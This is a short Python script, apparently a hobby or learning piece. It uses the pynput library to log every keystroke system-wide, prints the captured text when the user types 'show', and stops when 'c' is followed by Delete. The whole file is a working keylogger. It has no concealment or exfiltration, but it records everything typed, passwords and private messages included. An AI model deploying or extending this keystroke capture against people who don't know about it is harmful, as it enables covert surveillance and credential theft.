from pynput import keyboard
input_keys = []
def on_press(key):
    try:
        input_keys.append((key.char))
    except:
        input_keys.append(str(key))


###     stop monitoring     ###
def on_release(key):
    try:
        show = input_keys[-1] == 'w' and input_keys[-2] == 'o' and input_keys[-3] == 'h' and input_keys[-4] == 's'
        if show:
            for i in range(4):
                input_keys.pop()
            output_text = "".join(input_keys)
            print(output_text)
        ###     pree "c + delete" to stop monitoring       ###
        elif key == keyboard.Key.delete and input_keys[-2] == 'c':
                return False

    except:
        pass

###     keyboard listener      ###
def run_listener():
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()


run_listener()

